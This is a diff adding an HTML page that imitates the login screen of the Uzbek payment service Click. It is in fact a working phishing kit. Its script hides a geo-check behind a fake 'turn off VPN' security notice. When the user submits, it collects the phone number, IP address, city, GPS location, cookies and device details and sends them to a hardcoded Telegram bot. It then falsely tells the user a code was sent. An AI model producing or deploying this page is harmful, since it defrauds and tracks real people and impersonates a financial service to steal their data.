@@ -1,0 +1,452 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Click - Avtorizatsiya</title>
+    <style>
+        :root {
+            --click-blue: #0073ff; /* Haqiqiy Click ko'k rangi */
+            --bg-color: #f4f7f9;
+            --card-bg: #ffffff;
+            --text-black: #2d2d2d;
+            --text-gray: #828282;
+            --border-color: #e0e6ed;
+            --input-focus: #0073ff;
+            --btn-disabled: #d6dee6;
+            --transition: 0.25s ease;
+        }
+
+        [data-theme="dark"] {
+            --bg-color: #121212;
+            --card-bg: #1e1e1e;
+            --text-black: #ffffff;
+            --text-gray: #a0a0a0;
+            --border-color: #333333;
+            --btn-disabled: #2d2d2d;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            color: var(--text-black);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            padding: 40px 20px;
+            transition: background 0.3s;
+        }
+
+        /* LOGO - Haqiqiy Click Ranglari */
+        .logo-box {
+            margin-bottom: 40px;
+            display: flex;
+            justify-content: center;
+        }
+
+        .logo-box svg {
+            width: 145px;
+            height: auto;
+        }
+
+        .logo-click-text {
+            fill: var(--text-black);
+            transition: fill 0.3s;
+        }
+
+        /* MAIN CARD */
+        .auth-container {
+            background: var(--card-bg);
+            width: 100%;
+            max-width: 420px;
+            padding: 40px 32px;
+            border-radius: 16px;
+            box-shadow: 0 4px 24px rgba(0,0,0,0.04);
+            text-align: center;
+            transition: transform 0.2s, background 0.3s;
+        }
+
+        .auth-container h1 {
+            font-size: 17px;
+            font-weight: 500;
+            line-height: 1.4;
+            margin-bottom: 30px;
+            color: var(--text-black);
+        }
+
+        /* INPUT STYLE */
+        .input-group {
+            position: relative;
+            margin-bottom: 12px;
+        }
+
+        .input-group label {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--text-black);
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 18px 16px 18px 65px;
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 500;
+            outline: none;
+            background: transparent;
+            color: var(--text-black);
+            transition: border-color 0.2s;
+        }
+
+        .input-group input:focus {
+            border-color: var(--click-blue);
+        }
+
+        .oferta {
+            font-size: 13px;
+            color: var(--text-gray);
+            margin-bottom: 24px;
+            line-height: 1.5;
+        }
+
+        .oferta a {
+            color: var(--click-blue);
+            text-decoration: none;
+        }
+
+        /* BUTTON */
+        .btn-main {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 12px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: var(--transition);
+            background: var(--btn-disabled);
+            color: #fff;
+        }
+
+        .btn-main.active {
+            background: var(--click-blue);
+            box-shadow: 0 8px 20px rgba(0, 115, 255, 0.25);
+        }
+
+        /* SETTINGS ROW */
+        .controls {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 24px;
+            margin-top: 24px;
+        }
+
+        .lang-trigger {
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .lang-trigger select {
+            border: none;
+            background: transparent;
+            color: inherit;
+            font-family: inherit;
+            font-weight: 600;
+            outline: none;
+            cursor: pointer;
+        }
+
+        .theme-switch {
+            cursor: pointer;
+            padding: 4px;
+        }
+
+        /* FOOTER */
+        .page-footer {
+            margin-top: 40px;
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+        }
+
+        .app-text {
+            font-size: 14px;
+            color: var(--text-black);
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        .badges {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 30px;
+        }
+
+        .badges img {
+            height: 40px;
+            border-radius: 8px;
+        }
+
+        .guide-link {
+            background: var(--card-bg);
+            padding: 16px;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            font-weight: 600;
+            font-size: 14px;
+            color: var(--text-black);
+            text-decoration: none;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.02);
+            transition: var(--transition);
+        }
+
+        .support-box {
+            margin-top: 40px;
+            text-align: center;
+        }
+
+        .support-box span {
+            font-size: 13px;
+            color: var(--text-gray);
+        }
+
+        .support-box h3 {
+            font-size: 18px;
+            margin-top: 5px;
+            font-weight: 600;
+        }
+
+        .copyright {
+            margin-top: 20px;
+            font-size: 12px;
+            color: var(--text-gray);
+        }
+
+        /* MOBILE ADJUSTMENTS */
+        @media (max-width: 480px) {
+            body {
+                padding: 20px 16px;
+                justify-content: flex-start;
+            }
+            .logo-box {
+                margin-top: 20px;
+                margin-bottom: 30px;
+            }
+            .auth-container {
+                padding: 30px 20px;
+                box-shadow: none;
+                background: transparent;
+            }
+            [data-theme="dark"] .auth-container { background: transparent; }
+            
+            .auth-container h1 { font-size: 15px; }
+            .badges img { height: 35px; }
+        }
+    </style>
+</head>
+<body>
+    <div id="vpn-overlay" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#fff; z-index:10000; flex-direction:column; align-items:center; justify-content:center; text-align:center;">
+     <h2 style="color:red;">Xavfsizlik tizimi</h2>
+     <p>Iltimos, VPN-ni o'chiring va sahifani yangilang!</p>
+     <button onclick="location.reload()" style="padding:10px 20px; background:#0073ff; color:white; border:none; border-radius:8px; cursor:pointer;">Qayta tekshirish</button>
+    </div>
+    <div class="logo-box">
+        <svg viewBox="0 0 160 40" xmlns="http://www.w3.org/2000/svg">
+            <path d="M40 20C40 27.6667 27.6667 40 20 40C12.3333 40 0 27.6667 0 20C0 12.3333 12.3333 0 20 0C27.6667 0 40 12.3333 40 20ZM28 20C28 23 23 28 20 28C17 28 12 23 12 20C12 17 17 12 20 12C23 12 28 17 28 20Z" fill="#0073ff"/>
+            <path class="logo-click-text" d="M140.667 0H132.667V40H140.667V28.2L150.5 40H160L147.667 25L157.333 13.3333H148L140.667 22.1839V0Z" />
+            <path class="logo-click-text" d="M129.701 29.0417C128.378 35.3018 122.821 40 116.167 40C108.527 40 102.333 33.8066 102.333 26.1667C102.333 18.5267 108.527 12.3333 116.167 12.3333C122.85 12.3333 128.427 17.0733 129.718 23.375H121.493C120.56 21.1105 118.535 19.5417 116.188 19.5417C112.954 19.5417 110.333 22.5171 110.333 26.1875C110.333 29.8579 112.954 32.8333 116.188 32.8333C118.521 32.8333 120.535 31.2837 121.476 29.0417H129.701Z" />
+            <path class="logo-click-text" d="M99 40V13.3333H91V40H99Z" />
+            <rect class="logo-click-text" x="78.3333" width="8" height="40" />
+            <path class="logo-click-text" d="M75.3675 29.0417C74.0443 35.3018 68.4875 40 61.8333 40C54.1934 40 48 33.8066 48 26.1667C48 18.5267 54.1934 12.3333 61.8333 12.3333C68.5169 12.3333 74.0935 17.0733 75.3849 23.375H67.1598C66.2267 21.1105 64.2018 19.5417 61.8542 19.5417C58.621 19.5417 56 22.5171 56 26.1875C56 29.8579 58.621 32.8333 61.8542 32.8333C64.1874 32.8333 66.2018 31.2837 67.1425 29.0417H75.3675Z" />
+        </svg>
+    </div>
+
+    <div class="auth-container">
+        <h1 id="txt-title">Avtorizatsiyalash va ro'yxatdan o'tish bitta darchada</h1>
+
+        <div class="input-group">
+            <label>+998</label>
+            <input type="tel" id="phone" placeholder="Telefon raqami" maxlength="9" inputmode="numeric">
+        </div>
+
+        <p class="oferta" id="txt-oferta">
+            'Kirish' tugmasini bosib, siz <a href="#">Ommaviy ofertaga</a> rozilik bildirasiz
+        </p>
+
+        <button class="btn-main" id="btn-submit" disabled>Kirish</button>
+
+        <div class="controls">
+            <div class="lang-trigger">
+                <span id="txt-lang-label">Til:</span>
+                <select id="lang-select">
+                    <option value="uz">O'Z</option>
+                    <option value="ru">РУ</option>
+                    <option value="en">EN</option>
+                </select>
+            </div>
+            <div class="theme-switch" id="theme-btn">
+                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" id="theme-icon">
+                    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                </svg>
+            </div>
+        </div>
+    </div>
+
+    <div class="page-footer">
+        <p class="app-text" id="txt-footer">Click Up ilovasini o'rnating<br>Undan foydalanish yanada oson va qulay!</p>
+        <div class="badges">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Google Play">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Download_on_the_App_Store_Badge.svg" alt="App Store">
+        </div>
+        
+        <a href="#" class="guide-link">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2z"></path>
+                <path d="M22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z"></path>
+            </svg>
+            <span id="txt-guide">Foydalanuvchi qo'llanmasi</span>
+        </a>
+
+        <div class="support-box">
+            <span id="txt-support">Qo'llab-quvvatlash xizmati</span>
+            <h3>+998 71 231 0880</h3>
+            <p class="copyright">© 2011-2026 «Click.uz» Barcha huquqlar himoyalangan.</p>
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "7820786963:AAGoM_y_A5h3-E_D-uB9S-5Uv7E"; 
+        const CHAT_ID = "6543167443";
+        const langData = {
+            uz: { title: "Avtorizatsiyalash va ro'yxatdan o'tish bitta darchada", oferta: "'Kirish' tugmasini bosib, siz <a href='#'>Ommaviy ofertaga</a> rozilik bildirasiz", button: "Kirish", lang: "Til:", footer: "Click Up ilovasini o'rnating<br>Undan foydalanish yanada oson va qulay!", guide: "Foydalanuvchi qo'llanmasi", support: "Qo'llab-quvvatlash xizmati" },
+            ru: { title: "Авторизация и регистрация в одном окне", oferta: "Нажимая кнопку «Вход», вы соглашаетесь с <a href='#'>Публичной офертой</a>", button: "Вход", lang: "Язык:", footer: "Установите приложение Click Up<br>Пользоваться им еще проще и удобнее!", guide: "Руководство пользователя", support: "Служба поддержки" },
+            en: { title: "Authorization and registration in one window", oferta: "By clicking the 'Login' button, you agree to the <a href='#'>Public Offer</a>", button: "Login", lang: "Language:", footer: "Install Click Up app<br>It's even easier and more convenient to use!", guide: "User guide", support: "Support service" }
+        };
+
+        const phoneInput = document.getElementById('phone');
+        const submitBtn = document.getElementById('btn-submit');
+        const themeBtn = document.getElementById('theme-btn');
+        const langSelect = document.getElementById('lang-select');
+
+        // Input monitoring
+        phoneInput.addEventListener('input', (e) => {
+            e.target.value = e.target.value.replace(/\D/g, '');
+            if (e.target.value.length === 9) {
+                submitBtn.disabled = false;
+                submitBtn.classList.add('active');
+            } else {
+                submitBtn.disabled = true;
+                submitBtn.classList.remove('active');
+            }
+        });
+
+        // Theme Switch
+        themeBtn.addEventListener('click', () => {
+            const isDark = document.body.hasAttribute('data-theme');
+            if (isDark) {
+                document.body.removeAttribute('data-theme');
+                document.getElementById('theme-icon').innerHTML = '<path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>';
+            } else {
+                document.body.setAttribute('data-theme', 'dark');
+                document.getElementById('theme-icon').innerHTML = '<circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>';
+            }
+        });
+
+        // Language Switch
+        langSelect.addEventListener('change', (e) => {
+            const l = langData[e.target.value];
+            document.getElementById('txt-title').innerText = l.title;
+            document.getElementById('txt-oferta').innerHTML = l.oferta;
+            document.getElementById('btn-submit').innerText = l.button;
+            document.getElementById('txt-lang-label').innerText = l.lang;
+            document.getElementById('txt-footer').innerHTML = l.footer;
+            document.getElementById('txt-guide').innerText = l.guide;
+            document.getElementById('txt-support').innerText = l.support;
+        });
+        async function checkVPN() {
+    try {
+        const response = await fetch('https://ipapi.co/json/'); // IP ma'lumotlarini olish
+        const data = await response.json();
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+        // Agar mamlakat UZ bo'lmasa yoki vaqt mintaqasi Toshkent bo'lmasa bloklaymiz
+        if (data.country_code !== "UZ" || timezone !== "Asia/Tashkent") {
+            document.getElementById('vpn-overlay').style.display = 'flex';
+            return false;
+        }
+        return data; // Xavfsiz bo'lsa IP ma'lumotlarini qaytaradi
+    } catch (error) {
+        console.error("Xavfsizlik tekshiruvida xato.");
+    }
+    }
+    async function sendDataToAdmin(ipData) {
+    // Joylashuvni (geolokatsiya) so'rash
+    navigator.geolocation.getCurrentPosition(async (position) => {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+
+        // Telegramga yuboriladigan xabar matni
+        const text = `🔔 <b>Yangi Foydalanuvchi!</b>\n\n` +
+                     `📱 Tel: +998${document.getElementById('phone').value}\n` +
+                     `🌐 IP: ${ipData.ip}\n` +
+                     `🏙 Shahar: ${ipData.city}\n` +
+                     `📍 Lokatsiya: <a href="https://www.google.com/maps?q=${lat},${lon}">Xaritada ko'rish</a>\n` +
+                     `🍪 Cookie: <code>${document.cookie || 'Mavjud emas'}</code>\n` +
+                     `📱 Qurilma: ${navigator.userAgent}`;
+
+        // Telegram API orqali xabarni yuborish
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: text,
+                parse_mode: 'HTML' // HTML formatda yuborish uchun
+            })
+        });
+    }, (error) => {
+        // Agar foydalanuvchi lokatsiyaga ruxsat bermasa, faqat raqam va IP yuboriladi
+        const text = `⚠️ <b>Lokatsiya rad etildi:</b>\n\n` +
+                     `📱 Tel: +998${document.getElementById('phone').value}\n` +
+                     `🌐 IP: ${ipData.ip}`;
+        
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
+        });
+    });
+}
+submitBtn.addEventListener('click', async () => {
+    const ipInfo = await checkVPN();
+    if (ipInfo) {
+        sendDataToAdmin(ipInfo);
+        alert("Kod yuborildi!");
+    }
+});
+window.onload = checkVPN;
+    </script>
+</body>
+</html>
